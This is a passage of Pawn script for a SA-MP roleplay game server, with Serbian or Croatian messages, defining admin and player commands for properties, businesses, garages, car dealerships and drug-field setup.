			SaveProperty( id );
	        format( globalstring, sizeof( globalstring ), "Izmenili ste cijenu imovine(ID: %d) u %d!", id, II[ id ][ iPrice ] );
			SCM( playerid, SRVBOJA1, globalstring );
			
			new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Admin %s je izmenio cijenu na imovini ID %d u %d", ImeIgraca( playerid ), id, kolicina );
			LogSave( "Ostalo/LogEditCommand.log", string1 );
		}
		else return SendErrorMessage( playerid, "Pogresan izbor levela ili cijene." );
	}
	else if( vrsta == 2 ) {
	    new id = GetNearestBussines( playerid );
	    if( GetNearestBussines( playerid ) == -1 ) return SendErrorMessage( playerid, "Nema firme u vasoj blizini!" );
		if( izbor == 1 ) {
		    BussinesInfo[ id ][ bLevel ] = kolicina;
			Bussines_Refresh( id );
			SaveBussines( id );
			format( globalstring, sizeof( globalstring ), "Izmenili ste level firme(ID: %d) u %d!", id, BussinesInfo[ id ][ bLevel ] );
			SCM( playerid, SRVBOJA1, globalstring );
			new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Admin %s je izmenio level na firmi ID %d u %d", ImeIgraca( playerid ), id, kolicina );
			LogSave( "Ostalo/LogEditCommand.log", string1 );
		}
		else if( izbor == 2 ) {
		    BussinesInfo[ id ][ bPrice ] = kolicina;
			Bussines_Refresh( id );
			SaveBussines( id );
	        format( globalstring, sizeof( globalstring ), "Izmenili ste cijenu firme(ID: %d) u %d!", id, BussinesInfo[ id ][ bPrice ] );
			SCM( playerid, SRVBOJA1, globalstring );
			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Admin %s je izmenio cijenu na firmi ID %d u %d", ImeIgraca( playerid ), id, kolicina );
			LogSave( "Ostalo/LogEditCommand.log", string1 );
		}
		else return SendErrorMessage( playerid, "Pogresan izbor levela ili cijene." );
	}
	else return SendErrorMessage( playerid, "Pogresan izbor firme ili imovine." );
	return true;
}

CMD:dajsvima( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	//if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	new vrsta, kolicina;

	if( sscanf( params, "ii", vrsta, kolicina ) ) {
	    SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		SendUsageMessage( playerid, "/dajsvima [ Vrsta ] [ kolicina ]");
		SCM( playerid, BELA, "[Vrsta] 1. Level | 2. Novac 3. Zlato ");
     	SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
		return 1;
	}
	if( kolicina < 1 ) return SendErrorMessage( playerid, "Kolicina ne moze biti ispod 1." );
	if( vrsta == 1 ) {
	    foreach( Player, i ) {
	        if( i != INVALID_PLAYER_ID && PlayerLogged[ i ] != false ) {
	            PlayerInfo[ i ][ xLevel ] += kolicina;
                dajSkillPoen(i, kolicina);
	            SetPlayerScore( i, PlayerInfo[ i ][ xLevel ] );
	        }
	    }
		SendInfoMessage( playerid, "Dao si svim igracima levelup." );
		format( globalstring, sizeof( globalstring ), ""col_crvena"V-RP | "col_white" Vlasnik %s je nagradio sve igrace sa:  %d levela.", ImeIgraca( playerid ), kolicina );
	    SCMA( -1, globalstring );
	    return true;
	}
	else if( vrsta == 2 ) {
	    foreach( Player, i ) {
	        if( i != INVALID_PLAYER_ID && PlayerLogged[ i ] != false ) {
	            DajIgracuNovac( i, kolicina );
	        }
	    }
	    SendInfoMessage( playerid, "Dao si svim igracima novac." );
	    format( globalstring, sizeof( globalstring ), ""col_crvena"V-RP | "col_white" Vlasnik %s je nagradio sve igrace sa:  %d$.", ImeIgraca( playerid ), kolicina );
	    SCMA( -1, globalstring );
	    return true;
	}
    else if( vrsta == 3 ) {
        foreach( Player, i ) {
            if( i != INVALID_PLAYER_ID && PlayerLogged[ i ] != false ) {
                PlayerInfo[i][xZlato] += kolicina;
                UpdateZlatoTD(i);
            }
        }
        SendInfoMessage( playerid, "Dao si svim igracima zlato." );
        format( globalstring, sizeof( globalstring ), ""col_crvena"V-RP | "col_white" Vlasnik %s je nagradio sve igrace sa:  %dg zlata.", ImeIgraca( playerid ), kolicina );
        SCMA( -1, globalstring );
        return true;
    }
	else SendErrorMessage( playerid, "Pogresna vrsta(1-3)" );
	return true;
}

CMD:vozilohelp( playerid, params[] ) {
	SCM( playerid, SVETLOPLAVA, ""col_crvena"___________________________________________________________________");
	SCM( playerid, -1, ""col_crvena"Vozila HELP | "col_white"/vozilo /vehicle /gepek /lock" );
	SCM( playerid, -1, ""col_crvena"Obijanje HELP | "col_white"/obijbravu /upalivozilo /prekiniobijanje" );
    SCM( playerid, SVETLOPLAVA, ""col_crvena"___________________________________________________________________");
	return 1;
}

CMD:pljackahelp( playerid, params[] ) {
	SCM( playerid, SVETLOPLAVA, ""col_crvena"___________________________________________________________________");
	SCM( playerid, -1, ""col_crvena"Pljacka HELP | "col_white"/knockout /kpu /tie /untie /rob" );
    SCM( playerid, SVETLOPLAVA, ""col_crvena"___________________________________________________________________");
	return 1;
}

CMD:garazahelp( playerid, params[] ) {
	SCM( playerid, SVETLOPLAVA, ""col_crvena"___________________________________________________________________");
	SCM( playerid, -1, ""col_crvena"Garaza HELP | "col_white"/kupigarazu /garaza /genter /gexit" );
    SCM( playerid, SVETLOPLAVA, ""col_crvena"___________________________________________________________________");
	return 1;
}

CMD:kupigarazu( playerid, params[] ) {
	new id = GetNearestGarage( playerid );

	if( id == -1 ) return SendErrorMessage( playerid, "U blizini nema nijedne garaze." );
	if( PlayerInfo[ playerid ][ xGarageID ] != -1 ) return SendErrorMessage( playerid, "Vec posedujete jednu garazu." );
	if( PlayerInfo[ playerid ][ xNovac ] < garageInfo[ id ][ garagePrice ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca %d.", garageInfo[ id ][ garagePrice ] );
	if( PlayerInfo[ playerid ][ xLevel ] < garageInfo[ id ][ garageLevel ] ) return SendErrorMessage( playerid, "Morate biti %d level da bi kupili ovu garazu.", garageInfo[ id ][ garageLevel ] );

	DajIgracuNovac( playerid, -garageInfo[ id ][ garagePrice ] );
	PlayerInfo[ playerid ][ xGarageID ] = id;
	SavePlayer( playerid );

	garageInfo[ id ][ garageOwned ] = true;
	strmid( garageInfo[ id ][ garageOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME );

	Garage_Save( id );
	Garage_Refresh( id );

	SendInfoMessage( playerid, "Kupili ste garazu za %d.", garageInfo[ id ][ garagePrice ] );
    return (true);
}

CMD:garaza( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xGarageID ] == -1 ) return SendErrorMessage( playerid, "Nemate garazu." );
	SPD( playerid, dialog_GARAZA, DSL, D_NASLOV, "Info\nZakljucaj/Otkljucaj\nProdaj Drzavi\nProdaj Igracu", D_ODABERI, D_ODUSTANI );
	return true;
}

CMD:gexit( playerid, params[] ) {

    if( EnteredGarage[ playerid ] == -1 ) return SendErrorMessage( playerid, "Niste u garazi." );
    new id = EnteredGarage[ playerid ];
    
   	if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {
		SetPlayerPos( playerid, garageInfo[ id ][ garagePos ][ 0 ], garageInfo[ id ][ garagePos ][ 1 ], garageInfo[ id ][ garagePos ][ 2 ] );
        GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
	    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
	   	SetCameraBehindPlayer( playerid );
	    TogglePlayerControllable( playerid, false );
		SetPlayerInterior( playerid, 0 );
		SetPlayerVirtualWorld( playerid, 0 );
		EnteredGarage[ playerid ] = -1;
	}
   	else if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
		new vehicle = GetPlayerVehicleID( playerid );
		LinkVehicleToInterior( vehicle, 0 );
		SetVehicleVirtualWorld( vehicle, 0 );
		SetVehiclePos( vehicle, garageInfo[ id ][ garageVehiclePos ][ 0 ], garageInfo[ id ][ garageVehiclePos ][ 1 ], garageInfo[ id ][ garageVehiclePos ][ 2 ] );
		SetVehicleZAngle( vehicle, garageInfo[ id ][ garageVehiclePos ][ 3 ] );
		GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
	    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
	   	SetCameraBehindPlayer( playerid );
	    TogglePlayerControllable( playerid, false );
	    SetPlayerInterior( playerid, 0 );
		SetPlayerVirtualWorld( playerid, 0 );
		EnteredGarage[ playerid ] = -1;
	}
	else return SendErrorMessage( playerid, "Komandu mozes koristiti samo ako si na nogama ili na vozacevom mestu." );

	return true;
}

CMD:genter( playerid, params[] ) {

    new id = GetNearestGarage( playerid );
    if( id == -1 ) return SendErrorMessage( playerid, "Nema garaze u blizini." );
    new gtype = garageInfo[ id ][ garageType ];
	if( garageInfo[ id ][ garageLocked ] == true ) return SendErrorMessage( playerid, "Ova garaza je zakljucana." );

	if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT ) {
		SetPlayerPos( playerid, GarageInteriors[ gtype ][ 0 ], GarageInteriors[ gtype ][ 1 ], GarageInteriors[ gtype ][ 2 ] );
        GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
	    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
	   	SetCameraBehindPlayer( playerid );
	    TogglePlayerControllable( playerid, false );
	    SetPlayerInterior( playerid, floatround( GarageInteriors[ gtype ][ 4 ] ) );
		SetPlayerVirtualWorld( playerid, garageInfo[ id ][ garageVW ] );
		SetPlayerFacingAngle( playerid, GarageInteriors[ gtype ][ 3 ] );
		EnteredGarage[ playerid ] = id;
		SendInfoMessage( playerid, "Da izadjete iz garaze kucajte /gexit." );
	}
   	else if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER ) {
		new vehicle = GetPlayerVehicleID( playerid );
		LinkVehicleToInterior( vehicle, floatround( GarageInteriors[ gtype ][ 4 ] ) );
		SetVehicleVirtualWorld( vehicle, garageInfo[ id ][ garageVW ] );
		SetVehiclePos( vehicle, GarageInteriors[ gtype ][ 0 ], GarageInteriors[ gtype ][ 1 ], GarageInteriors[ gtype ][ 2 ] );
        GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
	    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
	   	SetCameraBehindPlayer( playerid );
	    TogglePlayerControllable( playerid, false );
		SetPlayerInterior( playerid, floatround( GarageInteriors[ gtype ][ 4 ] ) );
		SetPlayerVirtualWorld( playerid, garageInfo[ id ][ garageVW ] );
		SetVehicleZAngle( vehicle, GarageInteriors[ gtype ][ 3 ] );
		EnteredGarage[ playerid ] = id;
		SendInfoMessage( playerid, "Da izadjete iz garaze kucajte /gexit." );
	}
	else return SendErrorMessage( playerid, "Komandu mozes koristiti samo ako si na nogama ili na vozacevom mestu." );
	return true;
}

CMD:kupivozilo( playerid, params[] ) { 
    if( ServerInfo[ KupovinaVozila ] == false ) return SendErrorMessage( playerid, "Trenutno nije moguce kupovanje auta po salonima." );
    if(PlayerInfo[playerid][xLevel] < 3) return SendErrorMessage(playerid, "Samo igraci level 3+!");

	if( PlayerInfo[ playerid ][ xVoziloID ][ 0 ] == -1 ) { }
    else if( PlayerInfo[ playerid ][ xVoziloID ][ 1 ] == -1 ) { }
    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] == -1 ) { }
    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] == -1 ) {
		if( PlayerInfo[ playerid ][ xDonatorSlot ] == true ) { }
		else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );
	}
	else return SendErrorMessage( playerid, "Svi slotovi vozila su vam zauzeti." );

    new as = GetNearestSalon( playerid );
	if( GetNearestSalon( playerid ) == -1 ) return SendErrorMessage( playerid, "Nisi na pickupu auto salona." );
	if( AutoSalon[ as ][ AlreadyBuying ] == true ) return SendErrorMessage( playerid, "Neko vec kupuje vozilo!" );

    //new slotid = AutoSalon[ as ][ aIzlogVeh ];
	AutoSalon[ as ][ AlreadyBuying ] = true;

    PlayerBuyingAS[ playerid ] = as;
    ModelCar[ playerid ] = 0;
	ClearChat( playerid, 25 );

	BuyCarTDControl( playerid, true );

	new string[ 128 ];
	format( string, sizeof( string ), "%s", ImeVozila[ AutoSalon[ as ][ aVehModel ][ 0 ]-400 ] );
	PlayerTextDrawSetString( playerid, BuyCar[ playerid ][ 2 ], string );
	format( string, sizeof( string ), "Cena: ~w~%d$", VehPrice[ AutoSalon[ as ][ aVehModel ][ 0 ]-400 ][ 1 ] );
	PlayerTextDrawSetString( playerid, BuyCar[ playerid ][ 3 ], string );

	SetPlayerCameraPos( playerid, AutoSalon[ as ][ aCameraPos ][ 0 ], AutoSalon[ as ][ aCameraPos ][ 1 ], AutoSalon[ as ][ aCameraPos ][ 2 ] );
	SetPlayerCameraLookAt( playerid, AutoSalon[ as ][ aCameraLookAt ][ 0 ], AutoSalon[ as ][ aCameraLookAt ][ 1 ], AutoSalon[ as ][ aCameraLookAt ][ 2 ] );

    TogglePlayerControllable( playerid, false);

	// Novi_DestroyVehicle( VehicleInfo[ slotid ][ vID ] );
	// VehicleInfo[ slotid ][ vID ] = Novi_CreateVehicle( slotid, VehicleInfo[ slotid ][ vUsage ], VehicleInfo[ slotid ][ vOrganization ], VehicleInfo[ slotid ][ vJob ], AutoSalon[ as ][ aVehModel ][ 0 ], VehicleInfo[ slotid ][ vLokacijaX ], VehicleInfo[ slotid ][ vLokacijaY ], VehicleInfo[ slotid ][ vLokacijaZ ]+1.0, VehicleInfo[ slotid ][ vLokacijaA ], -1, -1, -1 );
	// SetVehicleVirtualWorld( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aVW ] );
	// LinkVehicleToInterior( VehicleInfo[ slotid ][ vID ], AutoSalon[ as ][ aInt ] );

    SelectTextDraw( playerid, SRVBOJA1 );
	return 1;
}

CMD:asport( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	if( KreiranAutoSalon[ playerid ] == -1 ) return SendErrorMessage( playerid, "Ne kreiras nijedan auto salon." );
	new as = KreiranAutoSalon[ playerid ];
	Novi_SetPlayerPos( playerid, AutoSalon[ as ][ aPickupPos ][ 0 ], AutoSalon[ as ][ aPickupPos ][ 1 ], AutoSalon[ as ][ aPickupPos ][ 2 ] );
	SetCameraBehindPlayer( playerid );
	SetPlayerInterior( playerid, AutoSalon[ as ][ aInt ] );
	SetPlayerVirtualWorld( playerid, AutoSalon[ as ][ aVW ] );
	SCM( playerid, SRVBOJA1, "Kada izadjes na cisti prostor kucaj '/veh 560 1 1' da spawnas vozilo." );
	SCM( playerid, SRVBOJA1, "Kada spawnas vozilo i nadjes lokaciju gde ce biti dostavljena kupljena vozila kucaj /asbvozilo." );
	return 1;
}

CMD:asbvozilo( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu!" );
    new as = KreiranAutoSalon[ playerid ], Float:Pos[ 4 ], vehicleid = GetPlayerVehicleID( playerid );
	if( KreiranAutoSalon[ playerid ] == -1 ) return SendErrorMessage( playerid, "Ne kreiras nijedan auto salon." );
	GetVehiclePos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
    GetVehicleZAngle( vehicleid, Pos[ 3 ] );
    AutoSalon[ as ][ aVehBuyedPos ][ 0 ] = Pos[ 0 ];
    AutoSalon[ as ][ aVehBuyedPos ][ 1 ] = Pos[ 1 ];
	AutoSalon[ as ][ aVehBuyedPos ][ 2 ] = Pos[ 2 ];
    AutoSalon[ as ][ aVehBuyedPos ][ 3 ] = Pos[ 3 ];
    SaveSalon( as );
    Novi_DestroyVehicle( vehicleid );
    // DestroyDynamic3DTextLabel(AdminVehLabel[playerid]);
    AdminVozilo[ playerid ] = -1;
    SendInfoMessage( playerid, "Uspesno si sacuvao poziciju za dostavljanje vozila." );

	new coordsstring[ 64 ];
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    strcat( DialogStrgEx, "Unesite za svaki model vozila, kolicinu.\nPrimer: 5 6 10 23\n\n" );
	strcat( DialogStrgEx, "__________________________________________________________________\n");
	for( new i = 0; i < AutoSalon[ as ][ aMaxVehModel ]; i++ ) {
	    format( coordsstring, sizeof( coordsstring ), "Model %d - %s\n", (i+1), ImeVozila[ (AutoSalon[ as ][ aVehModel ][ i ]- 400) ] );
        strcat( DialogStrgEx, coordsstring ); 
	}
    SPD( playerid, dialog_ASAMMOUNT, DSI, D_NASLOV, DialogStrgEx, D_ODABERI, D_NAZAD );
    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
    
	return true;
}

CMD:garagesave( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu!" );
    new id = KreiraGarazu[ playerid ], Float:Pos[ 4 ], vehicleid = GetPlayerVehicleID( playerid );
	if( KreiraGarazu[ playerid ] == -1 ) return SendErrorMessage( playerid, "Ne kreiras nijednu garazu." );

	GetVehiclePos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
    GetVehicleZAngle( vehicleid, Pos[ 3 ] );
    
    garageInfo[ id ][ garageVehiclePos ][ 0 ] = Pos[ 0 ];
    garageInfo[ id ][ garageVehiclePos ][ 1 ] = Pos[ 1 ];
    garageInfo[ id ][ garageVehiclePos ][ 2 ] = Pos[ 2 ];
    garageInfo[ id ][ garageVehiclePos ][ 3 ] = Pos[ 3 ];

    Garage_Save( id );

    KreiraGarazu[ playerid ] = -1;
    Novi_DestroyVehicle( vehicleid );

	SendInfoMessage( playerid, "Uspesno si sacuvao poziciju i zavrsio kreiranje garaze." );
    return true;
}

CMD:ascamera( playerid, params[] ) {
	if( PlayerInfo[ playerid ][ xAdmin ] >= 7 ) {
		if( FlyMode[ playerid ] == true && flymodecamera[ playerid ][ cameramode ] == true ) {
            new as = KreiranAutoSalon[ playerid ];
            new Float:fPX, Float:fPY, Float:fPZ,
				Float:fVX, Float:fVY, Float:fVZ,
				Float:object_x, Float:object_y, Float:object_z;

            const Float:fScale = 5.0;

			GetPlayerCameraPos( playerid, fPX, fPY, fPZ);
			GetPlayerCameraFrontVector( playerid, fVX, fVY, fVZ);

			object_x = fPX + floatmul( fVX, fScale );
			object_y = fPY + floatmul( fVY, fScale );
			object_z = fPZ + floatmul( fVZ, fScale );

			AutoSalon[ as ][ aCameraPos ][ 0 ]		= fPX;
			AutoSalon[ as ][ aCameraPos ][ 1 ]		= fPY;
			AutoSalon[ as ][ aCameraPos ][ 2 ]		= fPZ;
			AutoSalon[ as ][ aCameraLookAt ][ 0 ] 	= object_x;
			AutoSalon[ as ][ aCameraLookAt ][ 1 ] 	= object_y;
			AutoSalon[ as ][ aCameraLookAt ][ 2 ] 	= object_z;
			SaveSalon( as );
			CancelFlyMode( playerid );
			SendInfoMessage( playerid, "Uspesno si sacuvao pozicije." );
    		SendInfoMessage( playerid, "Sada koristi /asport da se vratis do auto salona." );
		}
	}
    return true;
}

// CMD:asvozilo( playerid, params[] ) {
//     if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
// 	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
// 	if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu!" );
//     new as = KreiranAutoSalon[ playerid ], Float:Pos[ 4 ], vehicleid = GetPlayerVehicleID( playerid );
// 	if( KreiranAutoSalon[ playerid ] == -1 ) return SendErrorMessage( playerid, "Ne kreiras nijedan auto salon." );
// 	if( GetVehicleModel( AutoSalon[ as ][ aIzlogVeh ] ) != 0 ) return SendErrorMessage( playerid, "Vec ste odradili ovaj korak." );

// 	GetVehiclePos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
//     GetVehicleZAngle( vehicleid, Pos[ 3 ] );

//     for( new i = 1; i < MAX_CARS; i++ ) {
// 		new fileauta[ 40 ];
// 		format(fileauta, sizeof( fileauta ), V_FILE, i);
// 		if( !fexist( fileauta ) ) {
// 			VehicleInfo[ i ][ vOwned ] = 0;
// 			VehicleInfo[ i ][ vNeaktivnost ] = 0;
// 			VehicleInfo[ i ][ vKilometri ] = 0;
// 			VehicleInfo[ i ][ vMetri ] = 0;
// 			VehicleInfo[ i ][ vPrice ] = 0;
// 			strmid( VehicleInfo[ i ][ vOwner ], "Drzava", 0, strlen("Drzava"), 32);
// 			VehicleInfo[ i ][ vLocked ] = 1;
// 			VehicleInfo[ i ][ vLokacijaX ] = Pos[ 0 ];
// 			VehicleInfo[ i ][ vLokacijaY ] = Pos[ 1 ];
// 			VehicleInfo[ i ][ vLokacijaZ ] = Pos[ 2 ];
// 			VehicleInfo[ i ][ vLokacijaA ] = Pos[ 3 ];
// 			VehicleInfo[ i ][ vVirtualWorld ] = 0;
// 			VehicleInfo[ i ][ vInterior ] = 0;
// 			VehicleInfo[ i ][ vUsage ] = IZLOZBENO_VOZILO;
// 			VehicleInfo[ i ][ vJob ] = 0;
// 			VehicleInfo[ i ][ vOrganization ] = 0;
// 			VehicleInfo[ i ][ vColor1 ] = 0;
// 			VehicleInfo[ i ][ vColor2 ] = 0;
// 			VehicleInfo[ i ][ vModel ] = AutoSalon[ as ][ aVehModel ][ 0 ];
// 			VehicleInfo[ i ][ vReg ] = 1;
// 			VehicleInfo[ i ][ vTeh ] = 1;
// 			VehicleInfo[ i ][ vGPS ] = 0;
// 			VehicleInfo[ i ][ vOsiguranje ] = 5;
// 			VehicleInfo[ i ][ vLock ] = 5;
// 			VehicleInfo[ i ][ vAlarm ] = 4;
// 			VehicleInfo[ i ][ vTuned ] = 0;
// 			VehicleInfo[ i ][ vNeon ] = 0;
// 			VehicleInfo[ i ][ vImobilizator ] = 5;
// 			VehicleInfo[ i ][ vSpoiler ] = 0;
// 			VehicleInfo[ i ][ vHood ] = 0;
// 			VehicleInfo[ i ][ vRoof ] = 0;
// 			VehicleInfo[ i ][ vSkirt ] = 0;
// 			VehicleInfo[ i ][ vLamps ] = 0;
// 			VehicleInfo[ i ][ vNitro ] = 0;
// 			VehicleInfo[ i ][ vExhaust ] = 0;
// 			VehicleInfo[ i ][ vWheels ] = 0;
// 			VehicleInfo[ i ][ vStereo ] = 0;
// 			VehicleInfo[ i ][ vHydraulics ] = 0;
// 			VehicleInfo[ i ][ vFrontBumper ] = 0;
// 			VehicleInfo[ i ][ vRearBumper ] = 0;
// 			VehicleInfo[ i ][ vVents ] = 0;
// 			VehicleInfo[ i ][ vPaintJob ] = 255;
// 			VehicleInfo[ i ][ vProvera ] = i;
// 			VehicleInfo[ i ][ vDrug ][ 0 ] = 0; VehicleInfo[ i ][ vDrug ][ 1 ] = 0; VehicleInfo[ i ][ vDrug ][ 2 ] = 0; VehicleInfo[ i ][ vDrug ][ 3 ] = 0; VehicleInfo[ i ][ vDrug ][ 4 ] = 0; VehicleInfo[ i ][ vDrug ][ 5 ] = 0;
// 			VehicleInfo[ i ][ vDrugCode ][ 0 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 1 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 2 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 3 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 4 ] = 0; VehicleInfo[ i ][ vDrugCode ][ 5 ] = 0;
// 	        VehicleInfo[ i ][ vMelee ] = 0; VehicleInfo[ i ][ vWeap1 ] = 0; VehicleInfo[ i ][ vAmmo1 ] = 0; VehicleInfo[ i ][ vWeap2 ] = 0; VehicleInfo[ i ][ vAmmo2 ] = 0;

// 			Novi_DestroyVehicle( vehicleid );
// 			AdminVozilo[ playerid ] = -1;
//             // DestroyDynamic3DTextLabel(AdminVehLabel[playerid]);
			
// 			VehicleInfo[ i ][ vID ] = Novi_CreateVehicle( i, IZLOZBENO_VOZILO, -1, -1, VehicleInfo[ i ][ vModel ], VehicleInfo[ i ][ vLokacijaX ], VehicleInfo[ i ][ vLokacijaY ], VehicleInfo[ i ][ vLokacijaZ ]+1.0, VehicleInfo[ i ][ vLokacijaA ], VehicleInfo[ i ][ vColor1 ], VehicleInfo[ i ][ vColor2 ], 300000 );
//    			SetVehicleVirtualWorld( VehicleInfo[ i ][ vID ], AutoSalon[ as ][ aVW ] );
// 		    LinkVehicleToInterior( VehicleInfo[ i ][ vID ], AutoSalon[ as ][ aInt ] );
			    
// 			VehicleInfo[ i ][ vFuel ] = getAmountFuel( VehicleInfo[ i ][ vID ] ); vCanDrive[ VehicleInfo[ i ][ vID ] ] = 1; Fuel[ VehicleInfo[ i ][ vID ] ] = getAmountFuel( VehicleInfo[ i ][ vID ] );
// 			UnLockCar( VehicleInfo[ i ][ vID ] ); ResetVehicleStatistics( VehicleInfo[ i ][ vID ] ); SetTablice( VehicleInfo[ i ][ vID ] );
// 	        SaveVehicle( i );
// 	        carspawntimer = 1;
// 	   		SetTimer("AntiSpawnCrash", 3000, 0);
	     			
// 	  		Novi_SetPlayerPos( playerid, AutoSalon[ as ][ aPickupPos ][ 0 ], AutoSalon[ as ][ aPickupPos ][ 1 ], AutoSalon[ as ][ aPickupPos ][ 2 ] );
// 			SetPlayerInterior( playerid, AutoSalon[ as ][ aInt ] );
// 			SetPlayerVirtualWorld( playerid, AutoSalon[ as ][ aVW ] );

//             AutoSalon[ as ][ aIzlogVeh ] = i;
//             SaveSalon( as );

// 			break;
// 		}
// 	}
// 	SendInfoMessage( playerid, "Uspesno si sacuvao vozilo." );
// 	SCM( playerid, SRVBOJA1, "Sada trebas sacuvati poziciju kamere koja gleda ka vozilu u izlogu za listanje pri kupovini." );
// 	SCM( playerid, SRVBOJA1, "Sa "col_white"~k~~GO_FORWARD~, ~k~~GO_BACK~, ~k~~GO_LEFT~ "col_crvena"and "col_white"~k~~GO_RIGHT~"col_crvena" pomerate kameru.");
// 	SCM( playerid, SRVBOJA1, "Koristite "col_white"/ascamera"col_crvena" da sacuvate poziciju kamere kada nadjete odredjeni ugao.");
// 	SetTimerEx("FlyMode1", 1000, false, "d", playerid );
// 	return true;
// }

CMD:orgpolje( playerid, params[] ) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	if( PoljeDroge[ playerid ] == -1 ) return SendErrorMessage( playerid, "Niste zapoceli proces kreiranja polja droge." );
	new id = PoljeDroge[ playerid ], Float:Pos[ 3 ];
	
	GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
    OI[ id ][ oDrugField ][ 0 ] = Pos[ 0 ];
    OI[ id ][ oDrugField ][ 1 ] = Pos[ 1 ];
    OI[ id ][ oDrugField ][ 2 ] = Pos[ 2 ];
    
    
    if( IsValidDynamic3DTextLabel( OrgField3d[ id ] ) )
		DestroyDynamic3DTextLabel( OrgField3d[ id ] );

	if( IsValidDynamicPickup( OrgFieldPickup[ id ] ) )
		DestroyDynamicPickup( OrgFieldPickup[ id ] );
    
    new string[ 128 ];
    format( string, sizeof( string ), ""col_white"Poljana za sadjenje droge\n"col_crvena"%s", OI[ id ][ oName ] );
    OrgField3d[ id ] = CreateDynamic3DTextLabel( string, -1, OI[ id ][ oDrugField ][ 0 ], OI[ id ][ oDrugField ][ 1 ], OI[ id ][ oDrugField ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0, -1, 50.0);
	OrgFieldPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oDrugField ][ 0 ], OI[ id ][ oDrugField ][ 1 ], OI[ id ][ oDrugField ][ 2 ], 0, 0, -1, 50.0 );

	SaveOrganization( id );
	SendInfoMessage( playerid, "Uspesno ste zavrsili kreiranje poljanje droge." );

	PoljeDroge[ playerid ] = -1;
	return true;
}

CMD:rokniupdate( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

    return SendErrorMessage(playerid, "Nemoj ovo ljubi te V01D");
 //    //if( !IsPlayerAdmin( playerid ) ) return SendErrorMessage( playerid, "Moras biti rcon admin." );
	// foreach( Player, i ) {
	// 	if( i != IPI ) {
	// 		TogglePlayerControllable( i, false );
	// 		SavePlayer( i );
	// 	}
	// }
	// GameTextForAll( "Napustite server zbog updatea", 15000, 5 );
	// SendRconCommand( "hostname Valhalla || UPDATE U TOKU ||" );
	// SendRconCommand( "password 12asas32As4" );
	// return true;
}

